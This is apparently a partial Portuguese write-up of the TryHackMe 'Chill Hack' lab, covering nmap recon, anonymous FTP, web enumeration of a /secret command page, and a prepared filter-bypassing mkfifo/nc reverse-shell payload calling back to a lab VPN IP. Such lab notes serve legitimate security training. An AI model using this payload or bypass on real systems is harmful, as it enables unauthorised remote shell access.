# chill-hack — TryHackMe

```text
[ TARGET ] 10.65.170.96
[ ROOM   ] Chill Hack
[ GOAL   ] user.txt / root.txt
[ STATUS ] PARTIAL — recon + pista de RCE; flags não salvas
```

## 01 — Recon (nmap)

```console
$ nmap -sC -sV -Pn -T5 10.65.170.96
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|  ftp-anon: Anonymous FTP login allowed
|_ -rw-r--r-- note.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Game Info
```

→ Achado: FTP anon + web. (raw: `chillhack.txt`)
→ Próximo: baixar note + enum web.

## 02 — FTP anônimo

```console
$ ftp anonymous@10.65.170.96
# get note.txt
Anurodh told me that there is some filtering on strings
being put in the command -- Apaar
```

→ Achado: hint de **command injection com filtro**. (raw: `note.txt`)
→ Próximo: achar o formulário/comando na web.

## 03 — Enum web

```console
$ gobuster dir -u http://10.65.170.96 -w common.txt
/secret               (Status: 200)   # commands page
```

→ Achado: `/secret` — página de comandos. (raw: `recuperado.txt`)
→ Próximo: bypass do filtro + reverse shell.

## 04 — Reverse shell (tentativa)

```console
$ # listener local (VPN IP do lab)
$ nc -n -l -p 4444

# payload anotado (filtro em strings):
\rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.136.19 4444 >/tmp/f
```

→ Achado: payload preparado com IP VPN `192.168.136.19`.
→ Próximo: confirmar shell → loot user/root → documentar flags.

## FLAGS / RESPOSTAS

| Item | Valor |
|---|---|
| user.txt | *(completar)* |
| root.txt | *(completar)* |

## Artefatos

`chillhack.txt` · `note.txt` · `recuperado.txt`
